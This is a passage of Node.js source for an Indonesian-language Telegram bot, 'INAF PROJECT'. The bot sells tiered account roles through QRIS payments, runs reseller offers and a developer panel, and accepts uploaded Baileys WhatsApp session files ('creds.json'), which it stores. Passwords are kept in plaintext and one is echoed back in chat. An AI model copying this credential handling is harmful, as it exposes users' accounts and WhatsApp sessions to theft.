    ...(isOwner ? [[{ text: "📋 List User", callback_data: "list_user" }, { text: "🎛 Buat Custom User", callback_data: "create_custom" }, { text: "🗑 Hapus User", callback_data: "delete_user" }]] : []),
    ...(developer ? [[{ text: "🛠 Developer Panel", callback_data: "inaf_dev_home" }]] : [])
  ];
  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, selamat datang di INAF PROJECT.\nPilih menu:`, { reply_markup: { inline_keyboard: keyboard } });
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});


// ================= INAF PROJECT: SAFE STORE / DEPOSIT / DEVELOPER ADD-ON =================
// Additive module: existing account-management callbacks and APIs remain in place.
const INAF_STORE_FILE = path.join(__dirname, 'inaf_store.json');
const INAF_UPLOAD_DIR = path.join(__dirname, 'inaf_uploads');
const inafPending = new Map();
if (!fs.existsSync(INAF_UPLOAD_DIR)) fs.mkdirSync(INAF_UPLOAD_DIR, { recursive: true });
function inafDefaultStore() {
  return { brand: 'INAF PROJECT', qrisFileId: null, bannerFileId: null, prices: { member: 10000, vip: 25000, reseller: 50000, admin: 100000, tk: 150000, owner: 250000, high_owner: 350000, kingz: 500000, founder: 750000 }, groupLinks: {}, transactions: [], deposits: [], balances: {}, sellerRates: {}, commissionPercent: 10, offers: [], developerIds: [OWNER_ID], groupWelcome: 'Selamat datang di INAF PROJECT.' };
}
function inafLoad() {
  if (!fs.existsSync(INAF_STORE_FILE)) fs.writeFileSync(INAF_STORE_FILE, JSON.stringify(inafDefaultStore(), null, 2));
  let data;
  try { data = JSON.parse(fs.readFileSync(INAF_STORE_FILE, 'utf8')); } catch (_) { data = inafDefaultStore(); }
  const defaults = inafDefaultStore();
  for (const [k,v] of Object.entries(defaults)) if (data[k] === undefined) data[k] = v;
  if (!data.prices || typeof data.prices !== 'object') data.prices = defaults.prices;
  if (!Number.isFinite(Number(data.commissionPercent))) data.commissionPercent = 10;
  if (!Array.isArray(data.transactions)) data.transactions = [];
  if (!Array.isArray(data.deposits)) data.deposits = [];
  if (!Array.isArray(data.offers)) data.offers = [];
  if (!Array.isArray(data.developerIds)) data.developerIds = [OWNER_ID];
  return data;
}
function inafSave(data) { fs.writeFileSync(INAF_STORE_FILE, JSON.stringify(data, null, 2)); }
const INAF_ROLE_ORDER = ['member','vip','reseller','admin','tk','owner','high_owner','kingz','founder','developer'];
function inafRole(role) { return String(role || 'member').toLowerCase().replace(/\s+/g, '_'); }
function inafCanSell(role) { return INAF_ROLE_ORDER.indexOf(inafRole(role)) >= 2; }
function inafIsDeveloper(id) {
  const cfg = inafLoad();
  const tg = loadTelegramConfig();
  return Number(id) === Number(OWNER_ID) || cfg.developerIds.map(Number).includes(Number(id)) || (tg.ownerList || []).map(Number).includes(Number(id));
}
function inafFindAccount(id, tgUsername) {
  const db = loadDatabase();
  return db.find(u => Number(u.telegramId) === Number(id)) || (tgUsername ? db.find(u => String(u.telegramUsername || '').toLowerCase() === String(tgUsername).toLowerCase() || String(u.username || '').toLowerCase() === String(tgUsername).toLowerCase()) : null);
}
function inafEsc(s) { return String(s ?? '').replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
function inafHomeKeyboard(id, username) {
  const acc = inafFindAccount(id, username);
  const rows = [[{ text: '🛒 Beli Role', callback_data: 'inaf_buy' }, { text: '🪪 My Title', callback_data: 'inaf_mytitle' }]];
  if (acc && inafCanSell(acc.role)) rows.push([{ text: '💰 Setoran', callback_data: 'inaf_deposit' }, { text: '🏷️ Jual Role', callback_data: 'inaf_sell' }]);
  rows.push([{ text: '⬅️ Menu Utama', callback_data: 'inaf_back_main' }]);
  return { inline_keyboard: rows };
}
async function inafEditOrSend(q, text, extra = {}) {
  const chatId = q.message.chat.id;
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: q.message.message_id, ...extra }); }
  catch (_) { await bot.sendMessage(chatId, text, extra); }
}
function inafTxId(prefix='TX') { return `${prefix}-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}`; }
function inafDevKeyboard() { return { inline_keyboard: [
  [{text:'💳 Atur QRIS',callback_data:'inaf_dev_qris'},{text:'🖼 Atur Banner',callback_data:'inaf_dev_banner'}],
  [{text:'💲 Atur Harga Role',callback_data:'inaf_dev_prices'},{text:'🔗 Atur Link Grup',callback_data:'inaf_dev_links'}],
  [{text:'👑 Atur Developer ID',callback_data:'inaf_dev_ids'},{text:'🔗 Hubungkan Akun',callback_data:'inaf_dev_link'}],
  [{text:'📊 Transaksi',callback_data:'inaf_dev_transactions'}],
  [{text:'📈 Komisi Reseller',callback_data:'inaf_dev_commission'}],
  [{text:'💰 Setujui Setoran',callback_data:'inaf_dev_deposits'}],
  [{text:'⬅️ Kembali',callback_data:'inaf_store_home'}]
]}; }
async function inafSendDeveloper(text, options={}) {
  const cfg = inafLoad();
  const ids = [...new Set([OWNER_ID, ...(cfg.developerIds || []), ...(loadTelegramConfig().ownerList || [])].map(Number))];
  for (const id of ids) { try { await bot.sendMessage(id, text, options); } catch (_) {} }
}
function inafTargetRoles(sellerRole) {
  const idx = INAF_ROLE_ORDER.indexOf(inafRole(sellerRole));
  return INAF_ROLE_ORDER.slice(0, Math.max(0, idx));
}
async function inafShowStore(chatId, userId, tgUsername) {
  const cfg = inafLoad();
  if (cfg.bannerFileId) { try { await bot.sendPhoto(chatId, cfg.bannerFileId, { caption: '🔥 INAF PROJECT', reply_markup: inafHomeKeyboard(userId, tgUsername) }); return; } catch (_) {} }
  await bot.sendMessage(chatId, '🔥 *INAF PROJECT STORE*\nPilih layanan yang tersedia:', { parse_mode:'Markdown', reply_markup: inafHomeKeyboard(userId, tgUsername) });
}
// Message flow is isolated by Telegram user ID; no bot.once listeners are added.
bot.on('message', async (msg) => {
  try {
    if (!msg || !msg.from || msg.chat.type !== 'private') return;
    const id = msg.from.id;
    const pending = inafPending.get(id);
    if (!pending) return;
    if (pending.type === 'dev_qris' || pending.type === 'dev_banner' || pending.type === 'buy_proof' || pending.type === 'deposit_proof') {
      if (!msg.photo || !msg.photo.length) { await bot.sendMessage(id, 'Kirim gambar sebagai foto Telegram, bukan teks/dokumen.'); return; }
      const fileId = msg.photo[msg.photo.length - 1].file_id;
      if (pending.type === 'dev_qris' || pending.type === 'dev_banner') {
        if (!inafIsDeveloper(id)) { inafPending.delete(id); return; }
        const cfg = inafLoad();
        if (pending.type === 'dev_qris') cfg.qrisFileId = fileId; else cfg.bannerFileId = fileId;
        inafSave(cfg); inafPending.delete(id);
        await bot.sendMessage(id, pending.type === 'dev_qris' ? '✅ QRIS toko berhasil diperbarui.' : '✅ Banner global berhasil diperbarui.');
        return;
      }
      const cfg = inafLoad();
      const list = pending.type === 'buy_proof' ? cfg.transactions : cfg.deposits;
      const item = list.find(x => x.id === pending.itemId && x.status === 'waiting_proof');
      if (!item || item.buyerId !== id && item.sellerId !== id) { inafPending.delete(id); return bot.sendMessage(id, '❌ Transaksi tidak ditemukan atau sudah tidak aktif.'); }
      item.proofFileId = fileId; item.status = 'pending_review'; item.updatedAt = new Date().toISOString();
      inafSave(cfg); inafPending.delete(id);
      const caption = `📥 *${pending.type === 'buy_proof' ? 'TRANSAKSI ROLE' : 'SETORAN'} BARU*\nID: ${item.id}\nPengguna: ${inafEsc(item.buyerName || item.sellerName)}\nRole/jenis: ${inafEsc(item.role || 'Setoran')}\nNominal: Rp${Number(item.amount).toLocaleString('id-ID')}\nStatus: Menunggu persetujuan`;
      const buttons = { reply_markup:{ inline_keyboard:[[{text:'✅ SETUJUI',callback_data:`inaf_approve_${pending.type === 'buy_proof'?'tx':'dep'}_${item.id}`},{text:'❌ TOLAK',callback_data:`inaf_reject_${pending.type === 'buy_proof'?'tx':'dep'}_${item.id}`}]] } };
      await inafSendDeveloper(caption, { parse_mode:'Markdown' });
      const devIds = [...new Set([OWNER_ID, ...inafLoad().developerIds, ...(loadTelegramConfig().ownerList||[])].map(Number))];
      for (const devId of devIds) { try { await bot.sendPhoto(devId, fileId, { caption, parse_mode:'Markdown', ...buttons }); } catch (_) {} }
      await bot.sendMessage(id, `✅ Bukti berhasil dikirim. ID: ${item.id}\nMenunggu pemeriksaan Developer.`);
      return;
    }
    if (!msg.text) return;
    const text = msg.text.trim();
    if (pending.type === 'buy_credentials') {
      const [username, password] = text.split('|').map(x => x.trim());
      if (!username || !password || username.length < 3 || password.length < 3 || username.length > 32 || password.length > 100) return bot.sendMessage(id, 'Format salah. Kirim username|password (minimal 3 karakter).');
      const db = loadDatabase();
      if (db.some(u => String(u.username).toLowerCase() === username.toLowerCase())) return bot.sendMessage(id, '❌ Username sudah digunakan. Kirim username|password lain.');
      const cfg = inafLoad(); const tx = cfg.transactions.find(x => x.id === pending.itemId);
      if (!tx || tx.status !== 'waiting_credentials') { inafPending.delete(id); return bot.sendMessage(id, 'Transaksi sudah tidak aktif.'); }
      tx.accountUsername = username; tx.accountPassword = password; tx.status = 'waiting_proof'; tx.updatedAt = new Date().toISOString(); inafSave(cfg);
      inafPending.set(id, { type:'buy_proof', itemId:tx.id });
      if (cfg.qrisFileId) await bot.sendPhoto(id, cfg.qrisFileId, { caption:`💳 QRIS INAF PROJECT\nNominal: Rp${Number(tx.amount).toLocaleString('id-ID')}\nID: ${tx.id}\nSetelah membayar, kirim foto bukti transfer.` });
      else await bot.sendMessage(id, `💳 Nominal pembayaran: Rp${Number(tx.amount).toLocaleString('id-ID')}\nQRIS belum diatur. Hubungi Developer.`);
      return;
    }
    if (pending.type === 'deposit_amount') {
      const amount = Number(text.replace(/[^0-9]/g,''));
      if (!Number.isSafeInteger(amount) || amount < 1000 || amount > 100000000) return bot.sendMessage(id, 'Nominal tidak valid. Minimal Rp1.000. Kirim angka saja.');
      const cfg = inafLoad(); const dep = { id:inafTxId('DEP'), sellerId:id, sellerName:msg.from.username || msg.from.first_name, amount, status:'waiting_proof', createdAt:new Date().toISOString() };
      cfg.deposits.push(dep); inafSave(cfg); inafPending.set(id,{type:'deposit_proof',itemId:dep.id});
      if (cfg.qrisFileId) await bot.sendPhoto(id,cfg.qrisFileId,{caption:`💰 SETORAN INAF PROJECT\nNominal: Rp${amount.toLocaleString('id-ID')}\nID: ${dep.id}\nKirim foto bukti pembayaran.`});
      else await bot.sendMessage(id,`Nominal setoran Rp${amount.toLocaleString('id-ID')} dicatat. QRIS belum diatur; hubungi Developer.`);
      return;
    }
    if (pending.type === 'dev_prices') {
      if (!inafIsDeveloper(id)) return;
      const [role, amountText] = text.split('|').map(x=>x.trim().toLowerCase()); const amount=Number((amountText||'').replace(/[^0-9]/g,''));
      if (!INAF_ROLE_ORDER.includes(role) || !Number.isSafeInteger(amount) || amount < 0 || amount > 1000000000) return bot.sendMessage(id,'Format: role|harga. Contoh: vip|25000');
      const cfg=inafLoad(); cfg.prices[role]=amount; for (const offer of cfg.offers) if (offer.role===role) offer.price=amount; inafSave(cfg); inafPending.delete(id); return bot.sendMessage(id,`✅ Harga ${role} disimpan: Rp${amount.toLocaleString('id-ID')}`);
    }
    if (pending.type === 'dev_links') {
      if (!inafIsDeveloper(id)) return;
      const [role, link] = text.split('|').map(x=>x.trim());
      if (!INAF_ROLE_ORDER.includes(inafRole(role)) || !/^https:\/\/(chat\.whatsapp\.com|t\.me)\//i.test(link || '')) return bot.sendMessage(id,'Format: role|https://chat.whatsapp.com/... (atau link t.me).');
      const cfg=inafLoad(); cfg.groupLinks[inafRole(role)]=link; inafSave(cfg); inafPending.delete(id); return bot.sendMessage(id,`✅ Link grup role ${inafRole(role)} disimpan.`);
    }
    if (pending.type === 'dev_link_account') {
      if (!inafIsDeveloper(id)) return; const [username, telegramIdText]=text.split('|').map(x=>x.trim()); const telegramId=Number(telegramIdText); if(!username||!Number.isSafeInteger(telegramId)||telegramId<=0) return bot.sendMessage(id,'Format: username|telegram_id'); const db=loadDatabase();const user=db.find(u=>String(u.username).toLowerCase()===username.toLowerCase());if(!user)return bot.sendMessage(id,'Username tidak ditemukan di database akun.');if(db.some(u=>u!==user&&Number(u.telegramId)===telegramId))return bot.sendMessage(id,'Telegram ID sudah terhubung ke akun lain.');user.telegramId=telegramId;saveDatabase(db);inafPending.delete(id);return bot.sendMessage(id,`✅ Telegram ID ${telegramId} berhasil dihubungkan ke akun ${user.username}.`);
    }
    if (pending.type === 'dev_commission') {
      if (!inafIsDeveloper(id)) return; const rate=Number(text); if(!Number.isInteger(rate)||rate<0||rate>100) return bot.sendMessage(id,'Masukkan angka bulat 0 sampai 100.'); const cfg=inafLoad();cfg.commissionPercent=rate;inafSave(cfg);inafPending.delete(id);return bot.sendMessage(id,`✅ Komisi reseller diatur ${rate}%.`);
    }
    if (pending.type === 'dev_ids') {
      if (!inafIsDeveloper(id)) return;
      const ids=text.split(/[ ,]+/).map(Number).filter(x=>Number.isSafeInteger(x)&&x>0);
      if (!ids.length) return bot.sendMessage(id,'Masukkan Telegram user ID, pisahkan dengan koma.');
      const cfg=inafLoad(); cfg.developerIds=[...new Set([OWNER_ID,...ids])]; inafSave(cfg); inafPending.delete(id); return bot.sendMessage(id,'✅ Daftar Developer diperbarui.');
    }
  } catch (err) { console.error('[INAF message flow]',err); }
});

bot.onText(/^\/mytitle(?:@\w+)?$/i, async (msg) => {
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id,'Perintah /mytitle tersedia melalui chat pribadi bot.');
  const account=inafFindAccount(msg.from.id,msg.from.username);
  if (!account) return bot.sendMessage(msg.chat.id,'❌ Akun belum terhubung. Hubungi Developer untuk menghubungkan Telegram ID ke akun.');
  const cfg=inafLoad(); const banner=cfg.bannerFileId;
  const text=`🪪 *INAF PROJECT — MY TITLE*\n\n👤 Username: ${inafEsc(account.username)}\n🎖 Role: ${inafEsc(account.role || 'member')}\n📅 Expired: ${inafEsc(account.expiredDate || '-')}\n🆔 Telegram ID: ${msg.from.id}\n💰 Saldo reseller: Rp${Number(cfg.balances[msg.from.id]||0).toLocaleString('id-ID')}\n📌 Status: ${account.expiredDate && new Date(account.expiredDate+'T23:59:59') < new Date() ? 'Expired' : 'Aktif'}`;
  if (banner) return bot.sendPhoto(msg.chat.id,banner,{caption:text,parse_mode:'Markdown'});
  return bot.sendMessage(msg.chat.id,text,{parse_mode:'Markdown'});
});

bot.on('callback_query', async (q) => {
  const id=q.from.id, data=q.data || '';
  if (!data.startsWith('inaf_')) return;
  try {
    if (q.message.chat.type !== 'private' && !data.startsWith('inaf_group_')) { await bot.answerCallbackQuery(q.id,{text:'Buka bot melalui chat pribadi.'}); return; }
    const acc=inafFindAccount(id,q.from.username); const cfg=inafLoad();
    if (data === 'inaf_group_mytitle') { await bot.answerCallbackQuery(q.id); await bot.sendMessage(q.message.chat.id,'Gunakan /mytitle di chat pribadi bot untuk melihat title lengkap.'); return; }
    if (data === 'inaf_group_help') { await bot.answerCallbackQuery(q.id); await bot.sendMessage(q.message.chat.id,'Menu grup hanya menyediakan informasi umum. Transaksi dan pengaturan dilakukan di chat pribadi bot.'); return; }
    if (data === 'inaf_store_home') { await bot.answerCallbackQuery(q.id); await inafShowStore(q.message.chat.id,id,q.from.username); return; }
    if (data === 'inaf_back_main') { await bot.answerCallbackQuery(q.id); return bot.sendMessage(id,'Menu utama INAF PROJECT. Ketik /start untuk membuka menu lengkap.'); }
    if (data === 'inaf_mytitle') { await bot.answerCallbackQuery(q.id); if (!acc) return bot.sendMessage(id,'❌ Akun belum terhubung ke Telegram ID. Hubungi Developer.'); const cfg2=inafLoad(); const t=`🪪 *MY TITLE*\nUsername: ${inafEsc(acc.username)}\nRole: ${inafEsc(acc.role)}\nExpired: ${inafEsc(acc.expiredDate||'-')}\nTelegram ID: ${id}\nSaldo: Rp${Number(cfg2.balances[id]||0).toLocaleString('id-ID')}`; if(cfg2.bannerFileId) return bot.sendPhoto(id,cfg2.bannerFileId,{caption:t,parse_mode:'Markdown'}); return bot.sendMessage(id,t,{parse_mode:'Markdown'}); }
    if (data === 'inaf_buy') {
      await bot.answerCallbackQuery(q.id);
      const activeOffers=cfg.offers.filter(o=>o.active!==false);
      const rows=activeOffers.slice(0,20).map(o=>[{text:`${o.role.toUpperCase()} • ${o.sellerName} • Rp${Number(o.price).toLocaleString('id-ID')}`,callback_data:`inaf_offer_${o.id}`}]);
      const roles=INAF_ROLE_ORDER.filter(r=>r!=='developer' && Number(cfg.prices[r]||0)>0);
      rows.push([{text:'🛒 Beli langsung dari toko',callback_data:'inaf_direct_buy'}]);
      rows.push([{text:'⬅️ Kembali',callback_data:'inaf_store_home'}]);
      return inafEditOrSend(q,'🛒 *PILIH ROLE YANG INGIN DIBELI*',{parse_mode:'Markdown',reply_markup:{inline_keyboard:rows}});
    }
    if (data === 'inaf_direct_buy') {
      const roles=INAF_ROLE_ORDER.filter(r=>r!=='developer' && Number(cfg.prices[r]||0)>0);
      const rows=roles.map(r=>[{text:`${r.toUpperCase()} — Rp${Number(cfg.prices[r]).toLocaleString('id-ID')}`,callback_data:`inaf_buyrole_${r}`}]);
      rows.push([{text:'⬅️ Kembali',callback_data:'inaf_buy'}]); await bot.answerCallbackQuery(q.id); return inafEditOrSend(q,'Pilih role pembelian langsung:',{reply_markup:{inline_keyboard:rows}});
    }
    if (data.startsWith('inaf_offer_')) {
      const offer=cfg.offers.find(o=>o.id===data.slice('inaf_offer_'.length)&&o.active!==false);
      if(!offer) return bot.answerCallbackQuery(q.id,{text:'Lapak sudah tidak tersedia.'});
      if(offer.sellerId===id) return bot.answerCallbackQuery(q.id,{text:'Kamu tidak dapat membeli lapak sendiri.'});
      const tx={id:inafTxId(),buyerId:id,buyerName:q.from.username||q.from.first_name,sellerId:offer.sellerId,sellerName:offer.sellerName,offerId:offer.id,role:offer.role,amount:Number(offer.price),status:'waiting_credentials',createdAt:new Date().toISOString()}; cfg.transactions.push(tx); inafSave(cfg); inafPending.set(id,{type:'buy_credentials',itemId:tx.id});
      await bot.answerCallbackQuery(q.id); return bot.sendMessage(id,`🛒 Pembelian dari lapak ${offer.sellerName}\nRole: ${offer.role}\nHarga: Rp${Number(offer.price).toLocaleString('id-ID')}\nID: ${tx.id}\n\nKirim username|password untuk akun baru.`);
    }
    if (data.startsWith('inaf_buyrole_')) {
      const role=inafRole(data.slice('inaf_buyrole_'.length)); const price=Number(cfg.prices[role]||0);
      if (!INAF_ROLE_ORDER.includes(role)||!price||role==='developer') return bot.answerCallbackQuery(q.id,{text:'Role tidak tersedia.'});
      const tx={id:inafTxId(),buyerId:id,buyerName:q.from.username||q.from.first_name,role,amount:price,status:'waiting_credentials',createdAt:new Date().toISOString()}; cfg.transactions.push(tx); inafSave(cfg); inafPending.set(id,{type:'buy_credentials',itemId:tx.id});
      await bot.answerCallbackQuery(q.id); return bot.sendMessage(id,`🛒 Pembelian ${role.toUpperCase()}\nHarga: Rp${price.toLocaleString('id-ID')}\nID: ${tx.id}\n\nKirim username|password untuk akun baru.`);
    }
    if (data === 'inaf_deposit') {
      if (!acc || !inafCanSell(acc.role)) return bot.answerCallbackQuery(q.id,{text:'Fitur khusus reseller ke atas.'});
      inafPending.set(id,{type:'deposit_amount'}); await bot.answerCallbackQuery(q.id); return bot.sendMessage(id,'💰 Masukkan nominal setoran (angka saja), minimal Rp1.000.');
    }
    if (data === 'inaf_sell') {
      if (!acc || !inafCanSell(acc.role)) return bot.answerCallbackQuery(q.id,{text:'Fitur khusus reseller ke atas.'});
      const roles=inafTargetRoles(acc.role).filter(r=>Number(cfg.prices[r]||0)>0);
      await bot.answerCallbackQuery(q.id); if(!roles.length) return bot.sendMessage(id,'Belum ada role di bawah role kamu yang memiliki harga.');
      const rows=roles.map(r=>[{text:`Pasang ${r.toUpperCase()} • Rp${Number(cfg.prices[r]).toLocaleString('id-ID')}`,callback_data:`inaf_sellrole_${r}`}]);
      rows.push([{text:'📦 Lapak Saya',callback_data:'inaf_myoffers'}]);
      return bot.sendMessage(id,'🏷️ Pilih role yang ingin kamu jual. Harga mengikuti ketetapan Developer.',{reply_markup:{inline_keyboard:rows}});
    }
    if (data.startsWith('inaf_sellrole_')) {
      if(!acc || !inafCanSell(acc.role)) return bot.answerCallbackQuery(q.id,{text:'Khusus reseller ke atas.'});
      const role=inafRole(data.slice('inaf_sellrole_'.length));
      if(!inafTargetRoles(acc.role).includes(role) || !Number(cfg.prices[role]||0)) return bot.answerCallbackQuery(q.id,{text:'Role ini tidak bisa kamu jual.'});
      let offer=cfg.offers.find(o=>o.sellerId===id&&o.role===role);
      if(offer){offer.active=true;} else {offer={id:inafTxId('OFR'),sellerId:id,sellerName:q.from.username||q.from.first_name,role,price:Number(cfg.prices[role]),active:true,createdAt:new Date().toISOString()};cfg.offers.push(offer);}
      inafSave(cfg); await bot.answerCallbackQuery(q.id,{text:'Lapak dipublikasikan.'}); return bot.sendMessage(id,`✅ Lapak ${role.toUpperCase()} aktif. Harga Rp${Number(offer.price).toLocaleString('id-ID')}. Pembeli dapat melihatnya di INAF STORE.`);
    }
    if (data === 'inaf_myoffers') {
      if(!acc || !inafCanSell(acc.role)) return bot.answerCallbackQuery(q.id,{text:'Khusus reseller ke atas.'});
      const mine=cfg.offers.filter(o=>o.sellerId===id); const rows=mine.map(o=>[{text:`${o.active===false?'Nonaktif':'Aktif'} • ${o.role} • Rp${Number(o.price).toLocaleString('id-ID')}`,callback_data:`inaf_toggleoffer_${o.id}`}]); rows.push([{text:'⬅️ Kembali',callback_data:'inaf_sell'}]); await bot.answerCallbackQuery(q.id); return bot.sendMessage(id,'📦 Lapak saya (tekan untuk aktif/nonaktif):',{reply_markup:{inline_keyboard:rows}});
    }
    if (data.startsWith('inaf_toggleoffer_')) {
      const offer=cfg.offers.find(o=>o.id===data.slice('inaf_toggleoffer_'.length)&&o.sellerId===id); if(!offer) return bot.answerCallbackQuery(q.id,{text:'Lapak tidak ditemukan.'}); offer.active=offer.active===false; inafSave(cfg); await bot.answerCallbackQuery(q.id,{text:offer.active?'Lapak diaktifkan':'Lapak dinonaktifkan'}); return bot.sendMessage(id,`Status lapak ${offer.role}: ${offer.active?'Aktif':'Nonaktif'}`);
    }
    if (data === 'inaf_dev_home') { if(!inafIsDeveloper(id)) return bot.answerCallbackQuery(q.id,{text:'Khusus Developer.'}); await bot.answerCallbackQuery(q.id); return inafEditOrSend(q,'🛠 *INAF PROJECT — DEVELOPER PANEL*\nSemua pengaturan toko dan transaksi.',{parse_mode:'Markdown',reply_markup:inafDevKeyboard()}); }
    if (data.startsWith('inaf_dev_')) {
      if(!inafIsDeveloper(id)) return bot.answerCallbackQuery(q.id,{text:'Khusus Developer.'}); await bot.answerCallbackQuery(q.id);
      if(data==='inaf_dev_qris'){inafPending.set(id,{type:'dev_qris'});return bot.sendMessage(id,'Kirim foto QRIS baru. Foto ini menjadi QRIS global toko.');}
      if(data==='inaf_dev_banner'){inafPending.set(id,{type:'dev_banner'});return bot.sendMessage(id,'Kirim satu foto banner global INAF PROJECT.');}
      if(data==='inaf_dev_prices'){inafPending.set(id,{type:'dev_prices'});return bot.sendMessage(id,'Kirim role|harga. Contoh: reseller|50000');}
      if(data==='inaf_dev_links'){inafPending.set(id,{type:'dev_links'});return bot.sendMessage(id,'Kirim role|link_grup. Contoh: reseller|https://chat.whatsapp.com/...');}
      if(data==='inaf_dev_ids'){inafPending.set(id,{type:'dev_ids'});return bot.sendMessage(id,'Kirim daftar Telegram ID Developer dipisahkan koma. ID owner utama tetap dipertahankan.');}
      if(data==='inaf_dev_commission'){inafPending.set(id,{type:'dev_commission'});return bot.sendMessage(id,`Komisi reseller saat ini ${cfg.commissionPercent}%. Kirim angka 0-100 untuk mengubahnya.`);}
      if(data==='inaf_dev_link'){inafPending.set(id,{type:'dev_link_account'});return bot.sendMessage(id,'Kirim username|telegram_id untuk menghubungkan akun ke Telegram. Contoh: resellerku|123456789');}
      if(data==='inaf_dev_transactions'){const rows=cfg.transactions.slice(-10).reverse();const t=rows.length?rows.map(x=>`${x.id} | ${x.role} | Rp${Number(x.amount).toLocaleString('id-ID')} | ${x.status}`).join('\n'):'Belum ada transaksi.';return bot.sendMessage(id,`📊 TRANSAKSI TERBARU\n${t}`);}
